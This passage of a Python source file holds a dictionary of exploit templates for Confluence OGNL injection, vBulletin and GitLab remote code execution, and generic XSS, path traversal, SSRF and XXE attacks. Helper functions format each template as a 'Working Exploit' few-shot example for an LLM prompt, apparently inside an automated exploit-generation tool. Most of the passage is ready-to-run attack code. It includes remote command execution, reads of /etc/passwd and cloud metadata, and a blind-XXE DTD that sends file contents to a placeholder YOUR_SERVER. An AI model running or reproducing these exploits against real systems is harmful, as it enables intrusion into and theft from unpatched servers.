        affected_products=["Confluence Server < 7.12.5", "Confluence Server < 7.4.11"],
        description="Confluence Server allows OGNL injection in the Widget Connector macro, leading to RCE.",
        exploit_template='''import requests

# CVE-2021-26084: Confluence OGNL Injection RCE
# CWE-917: Expression Language Injection

target = "__TARGET_PLACEHOLDER__"

def exploit(cmd="id"):
    print(f"[*] CVE-2021-26084 - Confluence OGNL Injection")
    print(f"[*] Target: {target}")
    
    # OGNL payload
    payload = f"""%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{cmd}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D"""
    
    endpoints = [
        "/pages/doenterpagevariables.action",
        "/pages/createpage-entervariables.action",
    ]
    
    for endpoint in endpoints:
        url = target + endpoint
        
        data = {{
            "queryString": payload
        }}
        
        print(f"[*] Trying: {endpoint}")
        
        try:
            response = requests.post(url, data=data, timeout=10)
            
            cmd_output = response.headers.get("X-Cmd-Response", "")
            if cmd_output:
                print(f"[+] RCE Successful!")
                print(f"[+] Output: {cmd_output}")
                return True
                
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    exploit("whoami")
''',
        success_indicators=["X-Cmd-Response", "uid="],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2021-26084"]
    ),
    
    "CVE-2022-26134": CVEExploitTemplate(
        cve_id="CVE-2022-26134",
        cwe="CWE-917",
        cwe_name="Expression Language Injection",
        name="Atlassian Confluence Pre-Auth OGNL RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Confluence Server 7.4.0-7.18.0"],
        description="Unauthenticated RCE via OGNL injection in Confluence Server URL.",
        exploit_template='''import requests
import urllib.parse

# CVE-2022-26134: Confluence Pre-Auth OGNL RCE
# CWE-917: Expression Language Injection

target = "__TARGET_PLACEHOLDER__"

def exploit(cmd="id"):
    print(f"[*] CVE-2022-26134 - Confluence Pre-Auth RCE")
    print(f"[*] Target: {target}")
    
    # OGNL payload in URL path
    payload = f"""/${{(@java.lang.Runtime@getRuntime().exec("{cmd}"))}}"""
    encoded_payload = urllib.parse.quote(payload, safe='')
    
    url = target + encoded_payload
    
    print(f"[*] Sending payload...")
    
    try:
        response = requests.get(url, timeout=10, allow_redirects=False)
        print(f"[*] Status: {response.status_code}")
        
        # Command might execute even with error response
        if response.status_code in [302, 500]:
            print("[+] Payload sent! Command may have executed.")
            return True
            
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    exploit("id")
''',
        success_indicators=["302", "500"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2022-26134"]
    ),
    
    # =========================================================================
    # GITLAB CVEs
    # =========================================================================
    
    "CVE-2021-22205": CVEExploitTemplate(
        cve_id="CVE-2021-22205",
        cwe="CWE-94",
        cwe_name="Code Injection",
        name="GitLab ExifTool RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["GitLab CE/EE 11.9-13.10.2"],
        description="GitLab allows unauthenticated RCE via malicious image file processed by ExifTool.",
        exploit_template='''import requests

# CVE-2021-22205: GitLab ExifTool RCE
# CWE-94: Code Injection

target = "__TARGET_PLACEHOLDER__"

def create_malicious_image(cmd):
    """Create DjVu file with embedded command."""
    # This requires djvulibre tools
    # djvumake exploit.djvu 'INFO=1,1' 'BGjp=/dev/null' 'ANTz=<command>'
    print(f"[*] Creating malicious DjVu with command: {cmd}")
    return None

def exploit(cmd="id"):
    print(f"[*] CVE-2021-22205 - GitLab ExifTool RCE")
    print(f"[*] Target: {target}")
    
    # Endpoint that processes uploaded images
    upload_url = f"{target}/uploads/user"
    
    print("[*] This exploit requires:")
    print("    1. Create malicious DjVu file with djvulibre")
    print("    2. Upload via /uploads/user endpoint")
    print("    3. ExifTool processes file and executes command")
    
    print("[*] Create payload with:")
    print(f'    djvumake exploit.djvu INFO=1,1 BGjp=/dev/null ANTz="(echo {cmd})"')
    
    return False

if __name__ == "__main__":
    exploit("id > /tmp/pwned")
''',
        success_indicators=["200", "upload"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2021-22205"]
    ),
    
    # =========================================================================
    # VBULLETIN CVEs
    # =========================================================================
    
    "CVE-2019-16759": CVEExploitTemplate(
        cve_id="CVE-2019-16759",
        cwe="CWE-94",
        cwe_name="Code Injection",
        name="vBulletin Pre-Auth RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["vBulletin 5.x < 5.5.4"],
        description="vBulletin allows unauthenticated RCE via widget template code injection.",
        exploit_template='''import requests

# CVE-2019-16759: vBulletin Pre-Auth RCE
# CWE-94: Code Injection

target = "__TARGET_PLACEHOLDER__"

def exploit(cmd="id"):
    print(f"[*] CVE-2019-16759 - vBulletin Pre-Auth RCE")
    print(f"[*] Target: {target}")
    
    url = f"{target}/ajax/render/widget_php"
    
    # PHP code injection via widgetConfig
    data = {{
        "widgetConfig[code]": f"echo shell_exec('{cmd}'); exit;"
    }}
    
    print(f"[*] Sending payload...")
    
    try:
        response = requests.post(url, data=data, timeout=10)
        
        if response.status_code == 200 and response.text:
            print(f"[+] RCE Successful!")
            print(f"[+] Output: {response.text}")
            return True
            
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    exploit("whoami")
''',
        success_indicators=["uid=", "www-data", "root"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2019-16759"]
    ),
    
    # =========================================================================
    # ADDITIONAL CWE TEMPLATES
    # =========================================================================
    
    "CWE-79": CVEExploitTemplate(
        cve_id="CWE-79",
        cwe="CWE-79",
        cwe_name="Cross-Site Scripting (XSS)",
        name="Cross-Site Scripting",
        severity="Medium",
        protocol="HTTP",
        affected_products=["Generic Web Applications"],
        description="XSS allows attackers to inject malicious scripts into web pages viewed by other users.",
        exploit_template='''import requests
import urllib.parse

# CWE-79: Cross-Site Scripting (XSS)
target = "__TARGET_PLACEHOLDER__"

def exploit():
    print(f"[*] Testing XSS")
    print(f"[*] Target: {target}")
    
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg/onload=alert('XSS')>",
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
        "<body onload=alert('XSS')>",
    ]
    
    params = ["q", "search", "name", "id", "query", "input"]
    
    for payload in payloads:
        for param in params:
            url = f"{target}?{param}={urllib.parse.quote(payload)}"
            
            try:
                response = requests.get(url, timeout=10)
                
                # Check if payload is reflected
                if payload in response.text or urllib.parse.unquote(payload) in response.text:
                    print(f"[+] XSS Found!")
                    print(f"[+] Param: {param}")
                    print(f"[+] Payload: {payload}")
                    return True
                    
            except Exception as e:
                pass
    
    return False

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["<script>", "alert", "XSS"],
        references=["https://cwe.mitre.org/data/definitions/79.html"]
    ),
    
    "CWE-22": CVEExploitTemplate(
        cve_id="CWE-22",
        cwe="CWE-22",
        cwe_name="Path Traversal",
        name="Path Traversal / Directory Traversal",
        severity="High",
        protocol="HTTP",
        affected_products=["Generic"],
        description="Path traversal allows attackers to access files outside the intended directory.",
        exploit_template='''import requests

# CWE-22: Path Traversal
target = "__TARGET_PLACEHOLDER__"

def exploit():
    print(f"[*] Testing Path Traversal")
    print(f"[*] Target: {target}")
    
    payloads = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ]
    
    params = ["file", "path", "page", "doc", "folder", "download"]
    
    for payload in payloads:
        for param in params:
            url = f"{target}?{param}={payload}"
            
            try:
                response = requests.get(url, timeout=10)
                
                # Check for file content indicators
                if "root:" in response.text or "[fonts]" in response.text:
                    print(f"[+] Path Traversal Found!")
                    print(f"[+] URL: {url}")
                    print(f"[+] Content: {response.text[:500]}")
                    return True
                    
            except Exception as e:
                pass
    
    return False

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["root:", "passwd", "[fonts]", "localhost"],
        references=["https://cwe.mitre.org/data/definitions/22.html"]
    ),
    
    "CWE-918": CVEExploitTemplate(
        cve_id="CWE-918",
        cwe="CWE-918",
        cwe_name="Server-Side Request Forgery (SSRF)",
        name="SSRF",
        severity="High",
        protocol="HTTP",
        affected_products=["Generic"],
        description="SSRF allows attackers to make requests from the server to internal resources.",
        exploit_template='''import requests

# CWE-918: Server-Side Request Forgery (SSRF)
target = "__TARGET_PLACEHOLDER__"
callback = "http://YOUR_SERVER:8080"  # Your listening server

def exploit():
    print(f"[*] Testing SSRF")
    print(f"[*] Target: {target}")
    
    # Internal targets
    ssrf_targets = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/",  # GCP metadata
        "http://192.168.1.1",  # Common internal
    ]
    
    params = ["url", "uri", "path", "link", "src", "redirect", "callback"]
    
    for ssrf_target in ssrf_targets:
        for param in params:
            url = f"{target}?{param}={ssrf_target}"
            
            try:
                response = requests.get(url, timeout=10)
                
                if "ami-id" in response.text or "internal" in response.text.lower():
                    print(f"[+] SSRF Found!")
                    print(f"[+] Target: {ssrf_target}")
                    print(f"[+] Response: {response.text[:500]}")
                    return True
                    
            except Exception as e:
                pass
    
    return False

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["ami-id", "meta-data", "internal", "127.0.0.1"],
        references=["https://cwe.mitre.org/data/definitions/918.html"]
    ),
    
    "CWE-611": CVEExploitTemplate(
        cve_id="CWE-611",
        cwe="CWE-611",
        cwe_name="XML External Entity (XXE)",
        name="XXE Injection",
        severity="High",
        protocol="HTTP",
        affected_products=["Generic XML Parsers"],
        description="XXE allows attackers to read files, perform SSRF, and potentially achieve RCE.",
        exploit_template='''import requests

# CWE-611: XML External Entity (XXE) Injection
target = "__TARGET_PLACEHOLDER__"

def exploit():
    print(f"[*] Testing XXE")
    print(f"[*] Target: {target}")
    
    # XXE payload to read /etc/passwd
    xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>"""

    # Blind XXE with external DTD
    blind_xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR_SERVER/xxe.dtd">
  %xxe;
]>
<root>test</root>"""

    headers = {{"Content-Type": "application/xml"}}
    
    print("[*] Trying direct XXE...")
    
    try:
        response = requests.post(target, data=xxe_payload, headers=headers, timeout=10)
        
        if "root:" in response.text:
            print("[+] XXE Successful!")
            print(f"[+] Content: {response.text}")
            return True
            
    except Exception as e:
        print(f"[-] Error: {e}")
    
    print("[*] For blind XXE, host this DTD on your server:")
    print('<!ENTITY % file SYSTEM "file:///etc/passwd">')
    print('<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \\'http://YOUR_SERVER/?x=%file;\\'>">')
    print("%eval; %exfil;")
    
    return False

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["root:", "passwd", "<!ENTITY"],
        references=["https://cwe.mitre.org/data/definitions/611.html"]
    ),
}



def get_cve_template(cve_id: str) -> Optional[CVEExploitTemplate]:
    """Get exploit template for a specific CVE."""
    return CVE_EXPLOIT_TEMPLATES.get(cve_id)


def get_cwe_template(cwe: str) -> Optional[CVEExploitTemplate]:
    """Get exploit template by CWE (fallback if no CVE match)."""
    # Clean CWE format
    cwe_clean = cwe.upper().split(":")[0].strip()
    
    # First check for exact CWE match
    if cwe_clean in CVE_EXPLOIT_TEMPLATES:
        return CVE_EXPLOIT_TEMPLATES[cwe_clean]
    
    # Then check CVEs by their CWE
    for template in CVE_EXPLOIT_TEMPLATES.values():
        if template.cwe == cwe_clean:
            return template
    
    return None


def get_template_for_context(cve: str = None, cwe: str = None) -> Optional[CVEExploitTemplate]:
    """Get best matching template for vulnerability context."""
    if cve:
        template = get_cve_template(cve)
        if template:
            return template
    
    if cwe:
        template = get_cwe_template(cwe)
        if template:
            return template
    
    return None


def format_template_for_prompt(template: CVEExploitTemplate, target: str = "http://localhost") -> str:
    """Format template as few-shot example for LLM prompt.
    
    Uses safe string replacement to avoid issues with curly braces in exploit code.
    """
    # Extract target IP from URL
    target_ip = target.replace("http://", "").replace("https://", "").split(":")[0]
    
    # DO NOT replace placeholders here - let LLM see and output them as-is
    # Placeholders will be replaced at execution time by exploit_executor.py
    # This ensures generated exploits have placeholders that can be swapped later
    exploit_code = template.exploit_template
    
    formatted = f'''
**CVE-SPECIFIC EXAMPLE: {template.cve_id}**
- **Name**: {template.name}
- **CWE**: {template.cwe} ({template.cwe_name})
- **Severity**: {template.severity}
- **Protocol**: {template.protocol}
- **Description**: {template.description}

**Working Exploit:**
```python
{exploit_code}
```

**Success Indicators**: {", ".join(template.success_indicators)}
'''
    return formatted

